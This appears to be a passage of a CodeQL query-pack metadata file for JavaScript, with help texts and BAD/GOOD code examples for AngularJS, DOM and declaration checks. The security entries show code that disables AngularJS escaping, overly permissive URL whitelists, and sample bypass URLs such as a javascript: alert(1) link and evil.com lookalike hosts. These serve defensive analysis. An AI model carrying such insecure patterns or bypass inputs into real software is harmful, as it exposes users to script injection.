---
queries:
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: AngularJS/DependencyMismatch.ql
  relativeBqrsPath: codeql/javascript-queries/AngularJS/DependencyMismatch.bqrs
  metadata:
    name: Dependency mismatch
    description: |-
      If the injected dependencies of a function go out of sync
                    with its parameters, the function will become difficult to
                    understand and maintain.
    kind: problem
    problem.severity: warning
    precision: very-high
    id: js/angular/dependency-injection-mismatch
    tags: |-
      quality
             reliability
             correctness
             frameworks/angularjs
  queryHelp: |
    # Dependency mismatch
    AngularJS has built-in support for dependency injection: directives can simply list the services they depend on and AngularJS will provide appropriate instances and pass them as arguments at runtime.

    Developers have to ensure that the list of dependencies matches the parameter list of the directive's factory function: if a dependency is missing, no service instance will be injected, and the corresponding parameter will default to `undefined`. If a dependency and its corresponding parameter have different names, this makes the code hard to follow, and may even indicate a bug.


    ## Recommendation
    Ensure that declared dependencies and parameters match up.


    ## Example
    The following example directive declares a single dependency on the `$compile` service, but its factory function has two parameters `$compile` and `$http`. Presumably the second parameter was introduced without adding a corresponding dependency, so the service will not be injected correctly.


    ```javascript
    angular.module('myapp')
           .directive('mydirective', [ '$compile', function($compile, $http) {
               // ...
           }]);
    ```
    To solve this problem, the `$http` service has to be listed as a dependency as well:


    ```javascript
    angular.module('myapp')
           .directive('mydirective', [ '$compile', '$http', function($compile, $http) {
               // ...
           }]);
    ```

    ## References
    * AngularJS Developer Guide: [Dependency Injection](https://docs.angularjs.org/guide/di).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: AngularJS/DisablingSce.ql
  relativeBqrsPath: codeql/javascript-queries/AngularJS/DisablingSce.bqrs
  metadata:
    name: Disabling SCE
    description: Disabling strict contextual escaping (SCE) can cause security vulnerabilities.
    kind: problem
    problem.severity: warning
    security-severity: 7.8
    precision: very-high
    id: js/angular/disabling-sce
    tags: |-
      security
             maintainability
             frameworks/angularjs
             external/cwe/cwe-116
  queryHelp: "# Disabling SCE\nAngularJS is secure by default through automated sanitization\
    \ and filtering of untrusted values that could cause vulnerabilities such as XSS.\
    \ Strict Contextual Escaping (SCE) is an execution mode in AngularJS that provides\
    \ this security mechanism.\n\nDisabling SCE in an AngularJS application is strongly\
    \ discouraged. It is even more discouraged to disable SCE in a library, since\
    \ it is an application-wide setting.\n\n\n## Recommendation\nDo not disable SCE.\n\
    \n\n## Example\nThe following example shows an AngularJS application that disables\
    \ SCE in order to dynamically construct an HTML fragment, which is later inserted\
    \ into the DOM through `$scope.html`.\n\n\n```javascript\nangular.module('app',\
    \ [])\n    .config(function($sceProvider) {\n        $sceProvider.enabled(false);\
    \ // BAD\n    }).controller('controller', function($scope) {\n        // ...\n\
    \        $scope.html = '<ul><li>' + item.toString() + '</li></ul>';\n    });\n\
    \n```\nThis is problematic, since it disables SCE for the entire AngularJS application.\n\
    \nInstead, just mark the dynamically constructed HTML fragment as safe using `$sce.trustAsHtml`,\
    \ before assigning it to `$scope.html`:\n\n\n```javascript\nangular.module('app',\
    \ [])\n    .controller('controller', function($scope, $sce) {\n        // ...\n\
    \        // GOOD (but should use the templating system instead)\n        $scope.html\
    \ = $sce.trustAsHtml('<ul><li>' + item.toString() + '</li></ul>'); \n    });\n\
    \n```\nPlease note that this example is for illustrative purposes only; use the\
    \ AngularJS templating system to dynamically construct HTML when possible.\n\n\
    \n## References\n* AngularJS Developer Guide: [Strict Contextual Escaping](https://docs.angularjs.org/api/ng/service/$sce)\n\
    * AngularJS Developer Guide: [Can I disable SCE completely?](https://docs.angularjs.org/api/ng/service/$sce#can-i-disable-sce-completely-).\n\
    * Common Weakness Enumeration: [CWE-116](https://cwe.mitre.org/data/definitions/116.html).\n"
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: AngularJS/DoubleCompilation.ql
  relativeBqrsPath: codeql/javascript-queries/AngularJS/DoubleCompilation.bqrs
  metadata:
    name: Double compilation
    description: |-
      Recompiling an already compiled part of the DOM can lead to
                    unexpected behavior of directives, performance problems, and memory leaks.
    kind: problem
    problem.severity: warning
    security-severity: 8.8
    id: js/angular/double-compilation
    tags: |-
      reliability
             frameworks/angularjs
             security
             external/cwe/cwe-1176
    precision: very-high
  queryHelp: |
    # Double compilation
    The AngularJS compiler processes (parts of) the DOM, determining which directives match which DOM elements, and then applies the directives to the elements. Each DOM element should only be compiled once, otherwise unexpected behavior may result.


    ## Recommendation
    Only compile new DOM elements.


    ## Example
    The following example (adapted from the AngularJS developer guide) shows a directive that adds a tooltip to a DOM element, and then compiles the entire element to apply nested directives.


    ```javascript
    angular.module('myapp')
           .directive('addToolTip', function($compile) {
      return {
        link: function(scope, element, attrs) {
          var tooltip = angular.element('<span ng-show="showToolTip">A tooltip</span>');
          tooltip.on('mouseenter mouseleave', function() {
            scope.$apply('showToolTip = !showToolTip');
          });
          element.append(tooltip);
          $compile(element)(scope); // NOT OK
        }
      };
    });

    ```
    This is problematic, since it will recompile all of `element`, including parts that have already been compiled.

    Instead, only the new element should be compiled:


    ```javascript
    angular.module('myapp')
           .directive('addToolTip', function($compile) {
      return {
        link: function(scope, element, attrs) {
          var tooltip = angular.element('<span ng-show="showToolTip">A tooltip</span>');
          tooltip.on('mouseenter mouseleave', function() {
            scope.$apply('showToolTip = !showToolTip');
          });
          element.append(tooltip);
          $compile(tooltip)(scope); // OK
        }
      };
    });

    ```

    ## References
    * AngularJS Developer Guide: [Double Compilation, and how to avoid it](https://docs.angularjs.org/guide/compiler#double-compilation-and-how-to-avoid-it).
    * Common Weakness Enumeration: [CWE-1176](https://cwe.mitre.org/data/definitions/1176.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: AngularJS/DuplicateDependency.ql
  relativeBqrsPath: codeql/javascript-queries/AngularJS/DuplicateDependency.bqrs
  metadata:
    name: Duplicate dependency
    description: Repeated dependency names are redundant for AngularJS dependency
      injection.
    kind: problem
    problem.severity: warning
    precision: very-high
    id: js/angular/duplicate-dependency
    tags: |-
      quality
             maintainability
             readability
             frameworks/angularjs
  queryHelp: |
    # Duplicate dependency
    Dependency injection in AngularJS is done by providing the names of the desired dependencies. Providing the same name multiple times is redundant since the AngularJS injector uses a cache for instantiated dependencies.


    ## Recommendation
    Only include the name of each dependency once.


    ## Example
    The following example shows an AngularJS controller with `$cookies` as a duplicate dependency.


    ```javascript
    angular.module('myModule', [])
        .controller('MyController', ['$scope',
                                     '$cookies',
                                     '$cookies', // REDUNDANT
                                     function($scope, , $cookies1, $cookies2) {
            // ...
        });

    ```
    This is problematic, since the programmer could be led to believe that the two parameters `$cookies1` and `$cookies2` are different instances, which they are not.

    Instead, the dependency should only be listed once:


    ```javascript
    angular.module('myModule', [])
        .controller('MyController', ['$scope',
                                     '$cookies',
                                     function($scope, $cookies) {
            // ...
        });

    ```

    ## References
    * AngularJS Developer Guide: [Dependency Injection](https://docs.angularjs.org/guide/di).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: AngularJS/IncompatibleService.ql
  relativeBqrsPath: codeql/javascript-queries/AngularJS/IncompatibleService.bqrs
  metadata:
    name: Incompatible dependency injection
    description: Dependency-injecting a service of the wrong kind causes an error
      at runtime.
    kind: problem
    problem.severity: error
    precision: high
    id: js/angular/incompatible-service
    tags: |-
      quality
             reliability
             correctness
             frameworks/angularjs
  queryHelp: |
    # Incompatible dependency injection
    AngularJS has built-in support for dependency injection: components can simply list the names of the services they depend on, and AngularJS will provide appropriate instances and pass them as arguments at runtime.

    Each injected service has a kind, this kind influences which components the service is compatible with.


    ## Recommendation
    Ensure that declared dependencies have the right kind for the component they are injected into.


    ## Example
    The following example shows a `config`-method that lists a dependency on a service named `year`. Later, a service of kind `value` is defined with the name `year`. This is not allowed, since `config`-methods can only be injected with services of kind `provider` or `constant`.


    ```javascript
    angular.module('myModule', [])
        .config(['year', function(year) {
            // ...
        }]);

    angular.module('myModule')
        .value('year', 2000); // BAD: year is of kind 'value'

    ```
    To solve this problem, the `year` service has to be of kind `constant`.


    ```javascript
    angular.module('myModule', [])
        .config(['year', function(year) {
            // ...
        }]);

    angular.module('myModule')
        .constant('year', 2000); // GOOD: year is of kind 'constant'

    ```

    ## References
    * AngularJS Developer Guide: [Dependency Injection](https://docs.angularjs.org/guide/di).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: AngularJS/InsecureUrlWhitelist.ql
  relativeBqrsPath: codeql/javascript-queries/AngularJS/InsecureUrlWhitelist.bqrs
  metadata:
    name: Insecure URL whitelist
    description: URL whitelists that are too permissive can cause security vulnerabilities.
    kind: problem
    problem.severity: warning
    security-severity: 7.5
    precision: very-high
    id: js/angular/insecure-url-whitelist
    tags: |-
      security
             frameworks/angularjs
             external/cwe/cwe-183
             external/cwe/cwe-625
  queryHelp: |
    # Insecure URL whitelist
    AngularJS uses filters to ensure that the URLs used for sourcing AngularJS templates and other script-running URLs are safe. One such filter is a whitelist of URL patterns to allow.

    A URL pattern that is too permissive can cause security vulnerabilities.


    ## Recommendation
    Make the whitelist URL patterns as restrictive as possible.


    ## Example
    The following example shows an AngularJS application with whitelist URL patterns that all are too permissive.


    ```javascript
    angular.module('myApp', [])
        .config(function($sceDelegateProvider) {
            $sceDelegateProvider.resourceUrlWhitelist([
                "*://example.org/*", // BAD
                "https://**.example.com/*", // BAD
                "https://example.**", // BAD
                "https://example.*" // BAD
            ]);
        });

    ```
    This is problematic, since the four patterns match the following malicious URLs, respectively:

    * `javascript://example.org/a%0A%0Dalert(1)` (`%0A%0D` is a linebreak)
    * `https://evil.com/?ignore=://example.com/a`
    * `https://example.evil.com`
    * `https://example.evilTld`

    ## References
    * OWASP/Google presentation: [Securing AngularJS Applications](https://www.owasp.org/images/6/6e/Benelus_day_20161125_S_Lekies_Securing_AngularJS_Applications.pdf)
    * AngularJS Developer Guide: [Format of items in resourceUrlWhitelist/Blacklist](https://docs.angularjs.org/api/ng/service/$sce#resourceUrlPatternItem).
    * Common Weakness Enumeration: [CWE-183](https://cwe.mitre.org/data/definitions/183.html).
    * Common Weakness Enumeration: [CWE-625](https://cwe.mitre.org/data/definitions/625.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: AngularJS/MissingExplicitInjection.ql
  relativeBqrsPath: codeql/javascript-queries/AngularJS/MissingExplicitInjection.bqrs
  metadata:
    name: Missing explicit dependency injection
    description: |-
      Functions without explicit dependency injections
                      will not work when their parameter names are minified.
    kind: problem
    problem.severity: warning
    precision: high
    id: js/angular/missing-explicit-injection
    tags: |-
      quality
             reliability
             correctness
             frameworks/angularjs
  queryHelp: |
    # Missing explicit dependency injection
    When AngularJS injects dependencies into a function that does not have an explicit dependency specification, it matches up dependencies with function parameters by name. This is dangerous, since some source code transformations such as minification may change the names of parameters. Such a renaming will break the AngularJS application.


    ## Recommendation
    Do not use implicit annotations for dependency injected functions when the code is minified later.


    ## Example
    The following example shows an AngularJS controller with implicit dependency annotations.


    ```javascript
    angular.module('myModule', [])
        .controller('MyController', function($scope) { // BAD: implicit dependency name
            // ...
    });

    ```
    This is problematic, since the minified version of this controller could look like the following:


    ```javascript
    angular.module('myModule', [])
        .controller('MyController', function(a) { // BAD: dependency 'a' does not exist
            // ...
    });

    ```
    This would mean that the function is dependency-injected with the dependency named "a", which does not exist, leading to a crash at runtime.

    Instead, in order to support minification, specify the dependencies with explicit annotations:


    ```javascript
    angular.module('myModule', [])
        .controller('MyController', ['$scope', function($scope) { // GOOD: explicit dependency name
            // ...
    }]);

    ```

    ## References
    * AngularJS Developer Guide: [Dependency Injection - Implicit Annotation](https://docs.angularjs.org/guide/di#implicit-annotation).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: AngularJS/RepeatedInjection.ql
  relativeBqrsPath: codeql/javascript-queries/AngularJS/RepeatedInjection.bqrs
  metadata:
    name: Repeated dependency injection
    description: Specifying dependency injections of an AngularJS component multiple
      times overrides earlier specifications.
    kind: problem
    problem.severity: warning
    precision: high
    id: js/angular/repeated-dependency-injection
    tags: |-
      quality
             maintainability
             readability
             frameworks/angularjs
  queryHelp: |
    # Repeated dependency injection
    AngularJS components can have a `$inject` property that specifies the dependencies to inject. You can assign this property multiple times, but doing so is confusing since later assignments overwrite earlier ones, and only the dependencies specified in the last assignment are actually injected.


    ## Recommendation
    Only specify dependencies once for each component.


    ## Example
    The following example shows an AngularJS controller that has its dependencies specified twice.


    ```javascript
    function myController($scope, $filter) {
        // ...
    }
    myController.$inject = ["$scope", "$cookies"]; // BAD: always overridden
    // ...
    myController.$inject = ["$scope", "$filter"];
    angular.module('myModule', []).controller('MyController', myController);

    ```
    This is problematic, since the second specification always overrides the first one.

    Instead, the dependencies should only be specified once:


    ```javascript
    function myController($scope, $filter) {
        // ...
    }
    myController.$inject = ["$scope", "$filter"]; // GOOD: specified once
    angular.module('myModule', []).controller('MyController', myController);

    ```

    ## References
    * AngularJS Developer Guide: [Dependency Injection](https://docs.angularjs.org/guide/di).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: AngularJS/UseNgSrc.ql
  relativeBqrsPath: codeql/javascript-queries/AngularJS/UseNgSrc.bqrs
  metadata:
    name: Use of AngularJS markup in URL-valued attribute
    description: |-
      Using AngularJS markup in an HTML attribute that references a URL
                    (such as 'href' or 'src') may cause the browser to send a request
                    with an invalid URL.
    kind: problem
    problem.severity: warning
    precision: very-high
    id: js/angular/expression-in-url-attribute
    tags: |-
      quality
             reliability
             correctness
             frameworks/angularjs
  queryHelp: |
    # Use of AngularJS markup in URL-valued attribute
    Using AngularJS markup (that is, AngularJS expressions enclosed in double curly braces) in HTML attributes that reference URLs is not recommended: the browser may attempt to fetch the URL before the AngularJS compiler evaluates the markup, resulting in a request for an invalid URL.

    While this is not a serious problem, it can degrade user experience, since the page may, for example, display broken image links while loading.


    ## Recommendation
    Use the corresponding AngularJS attributes: `ng-src` instead of `src`, `ng-href` instead of `href`, and `ng-srcset` instead of `srcset`.


    ## Example
    The following example snippet loads an image from a URL that contains the AngularJS expression `{{item._id}}`.


    ```html
    <img src="#/resources/pics/{{item._id}}">

    ```
    At page loading time before AngularJS has been fully initialized, the browser may attempt to load the image from the un-evaluated URL `#/resources/pics/{{item._id}}`, which will most likely fail and result in a broken image link. Later on when AngularJS has been loaded, the AngularJS compiler will evaluate the expression `{{item._id}}` and replace it with its value, which will cause the browser to reload the image.

    To avoid the broken link and the reload, use the AngularJS-specific attribute `ng-src`:


    ```html
    <img ng-src="#/resources/pics/{{item._id}}">

    ```

    ## References
    * AngularJS API Reference: [ngHref](https://docs.angularjs.org/api/ng/directive/ngHref).
    * AngularJS API Reference: [ngSrc](https://docs.angularjs.org/api/ng/directive/ngSrc).
    * AngularJS API Reference: [ngSrcset](https://docs.angularjs.org/api/ng/directive/ngSrcset).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: DOM/DuplicateAttributes.ql
  relativeBqrsPath: codeql/javascript-queries/DOM/DuplicateAttributes.bqrs
  metadata:
    name: Duplicate HTML element attributes
    description: |-
      Specifying the same attribute twice on the same HTML element is
                    redundant and may indicate a copy-paste mistake.
    kind: problem
    problem.severity: warning
    id: js/duplicate-html-attribute
    tags: |-
      quality
             maintainability
             readability
    precision: very-high
  queryHelp: |
    # Duplicate HTML element attributes
    According to the HTML5 standard, an HTML element must not have two or more attributes with the same name. If the attribute values are the same, this is most likely harmless, but it may indicate a copy-paste mistake.


    ## Recommendation
    Inspect the element in question and delete all but one of the redundant attributes.


    ## Example
    The following HTML snippet contains an anchor element with a redundant `href` attribute:


    ```html
    <a href="https://semmle.com" href="https://semmle.com">Semmle</a>
    ```
    The redundancy can be resolved by deleting one of the attributes:


    ```html
    <a href="https://semmle.com">Semmle</a>
    ```

    ## References
    * HTML5 Standard: [8.1.2.3 Attributes](https://www.w3.org/TR/html5/syntax.html#attributes-0).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: DOM/MalformedIdAttribute.ql
  relativeBqrsPath: codeql/javascript-queries/DOM/MalformedIdAttribute.bqrs
  metadata:
    name: Malformed id attribute
    description: |-
      If the id of an HTML attribute is malformed, its
                    interpretation may be browser-dependent.
    kind: problem
    problem.severity: warning
    id: js/malformed-html-id
    tags: |-
      quality
             reliability
             correctness
             external/cwe/cwe-758
    precision: very-high
  queryHelp: |
    # Malformed id attribute
    According to the HTML5 standard, the value of the `id` attribute of an element must contain at least one character, and must not contain any space characters. ID attributes that do not conform to this restriction may be interpreted differently by different browsers, and may indicate a misunderstanding on the part of the developer.


    ## Recommendation
    Inspect the ID attribute in question. If its value is empty, the attribute is most likely useless and can be removed. If it contains a space, perhaps the attribute was meant to be a `class` attribute.


    ## Example
    The following HTML element has an ID attribute with a space in it:


    ```html
    <div id="heading important">An important heading</div>
    ```
    Most likely this was meant to be a `class` attribute, like this:


    ```html
    <div class="heading important">An important heading</div>
    ```

    ## References
    * HTML5 Standard: [3.2.5.1 The id attribute](https://www.w3.org/TR/html5/dom.html#the-id-attribute).
    * Common Weakness Enumeration: [CWE-758](https://cwe.mitre.org/data/definitions/758.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: DOM/PseudoEval.ql
  relativeBqrsPath: codeql/javascript-queries/DOM/PseudoEval.bqrs
  metadata:
    name: Call to eval-like DOM function
    description: |-
      DOM functions that act like 'eval' and execute strings as code are dangerous and impede
                    program analysis and understanding. Consequently, they should not be used.
    kind: problem
    problem.severity: recommendation
    id: js/eval-like-call
    tags: |-
      quality
             maintainability
             readability
             external/cwe/cwe-676
    precision: very-high
  queryHelp: |
    # Call to eval-like DOM function
    Several DOM functions allow evaluating strings as code without using `eval` explicitly. They should be avoided for the same reason as `eval` itself.


    ## Recommendation
    When calling `setTimeout` or `setInterval`, do not pass it a string to evaluate but a function.

    Instead of using `document.write` to insert raw HTML into the DOM, use a framework such as [jQuery](http://jquery.com).


    ## Example
    In the following example, `setTimeout` is used to register a callback. The code to execute once the timeout expires is given as a string; this is bad practice.


    ```javascript
    setTimeout("notifyUser();", 1000);
    ```
    Instead, directly pass the function to be invoked to `setTimeout` like this:


    ```javascript
    setTimeout(notifyUser, 1000);
    ```

    ## References
    * D. Crockford, *JavaScript: The Good Parts*, Appendix B.3. O'Reilly, 2008.
    * Common Weakness Enumeration: [CWE-676](https://cwe.mitre.org/data/definitions/676.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Declarations/ArgumentsRedefined.ql
  relativeBqrsPath: codeql/javascript-queries/Declarations/ArgumentsRedefined.bqrs
  metadata:
    name: Arguments redefined
    description: |-
      The special 'arguments' variable can be redefined, but this should be avoided
                    since it makes code hard to read and maintain and may prevent compiler
                    optimizations.
    kind: problem
    problem.severity: recommendation
    id: js/arguments-redefinition
    tags: |-
      quality
             reliability
             performance
    precision: very-high
  queryHelp: "# Arguments redefined\nJavaScript functions can access their arguments\
    \ by position (rather than by parameter name) through the special `arguments`\
    \ object. However, if a function declares a parameter or local variable named\
    \ `arguments`, or assigns a new value to `arguments`, then the `arguments` object\
    \ is no longer available. This is confusing and makes code hard to understand,\
    \ so it should be avoided.\n\nAlso note that many popular JavaScript engines (such\
    \ as V8, which is used by Google Chrome and Node.js) do not support optimization\
    \ of functions that assign to `arguments`, so such functions will run more slowly.\n\
    \n\n## Recommendation\nRename the variable to something else.\n\n\n## Example\n\
    In the following example, the `arguments` parameter of function `f` shadows the\
    \ special `arguments` variable. As a result, the `arguments` object cannot be\
    \ accessed inside `f`. To the casual reader, the test `x === arguments[0]` may\
    \ look redundant, since normally `arguments[0]` refers to the first argument (`x`\
    \ in this case), which would make the test trivially true. This is not the case\
    \ here, however, since `arguments[0]` refers to the first element of the array\
    \ passed in as the second argument.\n\n\n```javascript\nfunction f(x, arguments)\
    \ {\n\tif (x === arguments[0])\n\t\treturn 23;\n\treturn 42;\n}\n```\n\n## References\n\
    * Mozilla Developer Network: [arguments](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Functions_and_function_scope/arguments).\n\
    * Petka Antonov: [Optimization killers](https://github.com/petkaantonov/bluebird/wiki/Optimization-killers#3-managing-arguments).\n"
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Declarations/AssignmentToConst.ql
  relativeBqrsPath: codeql/javascript-queries/Declarations/AssignmentToConst.bqrs
  metadata:
    name: Assignment to constant
    description: |-
      Assigning to a variable that is declared 'const' has either no effect or leads to a
                    runtime error, depending on the platform.
    kind: problem
    problem.severity: error
    id: js/assignment-to-constant
    tags: |-
      quality
             reliability
             correctness
    precision: very-high
  queryHelp: |
    # Assignment to constant
    Most popular JavaScript platforms support `const` declarations, although this feature is not part of the ECMAScript 5 standard. Assigning a new value to a variable that is declared `const` does not result in an error on current platforms, and simply has no effect. Relying on this behavior is error-prone, particularly since ECMAScript 2015 prohibits such assignments.


    ## Recommendation
    If the variable genuinely needs to be reassigned, change its declaration from `const` to `var`, or merge the assignment into the variable declaration, if possible. Otherwise, remove the spurious assignment.


    ## Example
    In the following example, `loc` is initialized to `null`, and then set to either `"here"` or `"there"`, depending on the value of variable `dist`. Most current platforms, however, will ignore the assignments entirely, so `loc` will retain its original value `null`.


    ```javascript
    const loc = null;
    if (dist < 10)
        loc = "here";
    else
        loc = "there";
    ```
    Instead, the assignments to `loc` can be merged into its declaration like this:


    ```javascript
    const loc = dist < 10 ? "here" : "there";
    ```

    ## References
    * Mozilla Developer Network: [const](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/const).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Declarations/ClobberingVarInit.ql
  relativeBqrsPath: codeql/javascript-queries/Declarations/ClobberingVarInit.bqrs
  metadata:
    name: Conflicting variable initialization
    description: |-
      If a variable is declared and initialized twice inside the same variable declaration
                    statement, the second initialization immediately overwrites the first one.
    kind: problem
    problem.severity: error
    id: js/variable-initialization-conflict
    tags: |-
      quality
             reliability
             correctness
             external/cwe/cwe-563
    precision: very-high
  queryHelp: |
    # Conflicting variable initialization
    If a variable is declared and initialized twice inside the same variable declaration statement, the second initialization immediately overwrites the first one. This is confusing at best, and probably indicates an underlying bug.


    ## Recommendation
    Rename the second variable declaration to avoid the conflict. For every use of the variable, examine it to find out whether it is meant to refer to the first or to the second declaration. If it is meant to refer to the second declaration, rename the use as well.


    ## Example
    In the following example, the variable declaration statement declares and initializes the variable `key` twice, once to `iter[0]` and once to `iter[1]`. The second initialization overwrites the first, so `key` ends up being set to `iter[1]`.


    ```javascript
    for (var iter in Iterator(aExtraHeaders)) {
        var key = iter[0], key = iter[1];
        xhr.setRequestHeader(key, value);
    }

    ```
    From context, it is clear that the second declaration is a typo: it should instead declare and initialize the variable `value`, which is referred to in the next line:


    ```javascript
    for (var iter in Iterator(aExtraHeaders)) {
        var key = iter[0], value = iter[1];
        xhr.setRequestHeader(key, value);
    }

    ```

    ## References
    * Ecma International, *ECMAScript Language Definition*, 5.1 Edition, Section 12.2. ECMA, 2011.
    * Common Weakness Enumeration: [CWE-563](https://cwe.mitre.org/data/definitions/563.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Declarations/ConflictingFunctions.ql
  relativeBqrsPath: codeql/javascript-queries/Declarations/ConflictingFunctions.bqrs
  metadata:
    name: Conflicting function declarations
    description: |-
      If two functions with the same name are declared in the same scope, one of the declarations
                    overrides the other without warning. This makes the code hard to read and maintain, and
                    may even lead to platform-dependent behavior.
    kind: problem
    problem.severity: error
    id: js/function-declaration-conflict
    tags: |-
      quality
             reliability
             correctness
             external/cwe/cwe-563
    precision: high
  queryHelp: "# Conflicting function declarations\nIf two functions with the same\
    \ name are declared in the same scope, one of the declarations overrides the other\
    \ without warning. This makes the code hard to read and maintain. In some cases,\
    \ which declaration overrides which may be platform dependent.\n\n\n## Recommendation\n\
    If the two declarations are duplicates, remove one of them. Otherwise, rename\
    \ one of them to distinguish the two functions, or turn the function declarations\
    \ into assignments of function expressions to the same local variable.\n\n\n##\
    \ Example\nIn the following example, function `converter` is defined differently\
    \ in the two branches of the `if` statement. However, the function definition\
    \ appearing later in the program text will override the one appearing earlier,\
    \ independent of the flow of execution through the `if` statement, so in this\
    \ case it is always the second function that is returned. (Note that this may\
    \ not be true on older browsers.)\n\n\n```javascript\nfunction getConverter(dir)\
    \ {\n\tif (dir === 'c2f') {\n\t\tfunction converter(c) {\n\t\t\treturn c * 9/5\
    \ + 32;\n\t\t}\n\t} else {\n\t\tfunction converter(f) {\n\t\t\treturn (f - 32)\
    \ * 5/9;\n\t\t}\n\t}\n\treturn converter;\n}\n```\nTo address this problem, introduce\
    \ a local variable `converter` and convert the function declarations into assignments\
    \ of function expressions to this variable:\n\n\n```javascript\nfunction getConverter(dir)\
    \ {\n\tvar converter;\n\tif (dir === 'c2f') {\n\t\tconverter = function (c) {\n\
    \t\t\treturn c * 9/5 + 32;\n\t\t};\n\t} else {\n\t\tconverter = function (f) {\n\
    \t\t\treturn (f - 32) * 5/9;\n\t\t};\n\t}\n\treturn converter;\n}\n```\n\n## References\n\
    * Ecma International, *ECMAScript Language Definition*, 5.1 Edition, Section 10.5.\
    \ ECMA, 2011.\n* Common Weakness Enumeration: [CWE-563](https://cwe.mitre.org/data/definitions/563.html).\n"
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Declarations/DeadStoreOfLocal.ql
  relativeBqrsPath: codeql/javascript-queries/Declarations/DeadStoreOfLocal.bqrs
  metadata:
    name: Useless assignment to local variable
    description: |-
      An assignment to a local variable that is not used later on, or whose value is always
                    overwritten, has no effect.
    kind: problem
    problem.severity: warning
    id: js/useless-assignment-to-local
    tags: |-
      quality
             maintainability
             useless-code
             external/cwe/cwe-563
    precision: very-high
  queryHelp: "# Useless assignment to local variable\nA value is assigned to a variable\
    \ or property, but either that location is never read later on, or its value is\
    \ always overwritten before being read. This means that the original assignment\
    \ has no effect, and could indicate a logic error or incomplete code.\n\n\n##\
    \ Recommendation\nEnsure that you check the control and data flow in the method\
    \ carefully. If a value is really not needed, consider omitting the assignment.\
    \ Be careful, though: if the right-hand side has a side-effect (like performing\
    \ a method call), it is important to keep this to preserve the overall behavior.\n\
    \n\n## Example\nIn the following example, the return value of the call to `send`\
    \ on line 2 is assigned to the local variable `result`, but then never used.\n\
    \n\n```javascript\nfunction f(x) {\n\tvar result = send(x);\n\twaitForResponse();\n\
    \treturn getResponse();\n}\n```\nAssuming that `send` returns a status code indicating\
    \ whether the operation succeeded or not, the value of `result` should be checked,\
    \ perhaps like this:\n\n\n```javascript\nfunction f(x) {\n\tvar result = send(x);\n\
    \t// check for error\n\tif (result === -1)\n\t\tthrow new Error(\"send failed\"\
    );\n\twaitForResponse();\n\treturn getResponse();\n}\n```\n\n## References\n*\
    \ Wikipedia: [Dead store](http://en.wikipedia.org/wiki/Dead_store).\n* Common\
    \ Weakness Enumeration: [CWE-563](https://cwe.mitre.org/data/definitions/563.html).\n"
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Declarations/DeadStoreOfProperty.ql
  relativeBqrsPath: codeql/javascript-queries/Declarations/DeadStoreOfProperty.bqrs
  metadata:
    name: Useless assignment to property
    description: An assignment to a property whose value is always overwritten has
      no effect.
    kind: problem
    problem.severity: warning
    id: js/useless-assignment-to-property
    tags: |-
      quality
             maintainability
             useless-code
    precision: high
  queryHelp: "# Useless assignment to property\nA value is assigned to a variable\
    \ or property, but either that location is never read later on, or its value is\
    \ always overwritten before being read. This means that the original assignment\
    \ has no effect, and could indicate a logic error or incomplete code.\n\n\n##\
    \ Recommendation\nEnsure that you check the control and data flow in the method\
    \ carefully. If a value is really not needed, consider omitting the assignment.\
    \ Be careful, though: if the right-hand side has a side-effect (like performing\
    \ a method call), it is important to keep this to preserve the overall behavior.\n\
    \n\n## Example\nIn the following example, the return value of the call to `send`\
    \ on line 2 is assigned to the local variable `result`, but then never used.\n\
    \n\n```javascript\nfunction f(x) {\n\tvar result = send(x);\n\twaitForResponse();\n\
    \treturn getResponse();\n}\n```\nAssuming that `send` returns a status code indicating\
    \ whether the operation succeeded or not, the value of `result` should be checked,\
    \ perhaps like this:\n\n\n```javascript\nfunction f(x) {\n\tvar result = send(x);\n\
    \t// check for error\n\tif (result === -1)\n\t\tthrow new Error(\"send failed\"\
    );\n\twaitForResponse();\n\treturn getResponse();\n}\n```\n\n## References\n*\
    \ Wikipedia: [Dead store](http://en.wikipedia.org/wiki/Dead_store).\n"
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Declarations/DeclBeforeUse.ql
  relativeBqrsPath: codeql/javascript-queries/Declarations/DeclBeforeUse.bqrs
  metadata:
    name: Variable not declared before use
    description: Variables should be declared before their first use.
    kind: problem
    problem.severity: warning
    id: js/use-before-declaration
    tags: |-
      quality
             maintainability
             readability
    precision: very-high
  queryHelp: "# Variable not declared before use\nJavaScript allows local variables\
    \ to be used before they are declared. However, this is confusing for readers\
    \ of the code, since it may not be clear whether the use refers to the local variable\
    \ or to a global variable of the same name.\n\n\n## Recommendation\nMove local\
    \ variable declarations to the beginning of the enclosing function, or (for global\
    \ variables) to the beginning of the source file.\n\n\n## Example\nIn the following\
    \ example, the local variable `x` declared in function `f` shadows the global\
    \ variable of the same name. However, the first use of the local variable precedes\
    \ its declaration, so a developer unfamiliar with the code might assume that this\
    \ use refers to the global variable instead of the local variable.\n\n\n```javascript\n\
    var x = 23;\n\nfunction f() {\n\tx = 42;\n\tvar x;\n}\n```\n\n## References\n\
    * D. Crockford, *JavaScript: The Good Parts*, Section 4.9. O'Reilly, 2008.\n"
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Declarations/DefaultArgumentReferencesNestedFunction.ql
  relativeBqrsPath: codeql/javascript-queries/Declarations/DefaultArgumentReferencesNestedFunction.bqrs
  metadata:
    name: Default parameter references nested function
    description: |-
      If a default parameter value references a function that is nested inside the
                    function to which the parameter belongs, a runtime error will occur, since
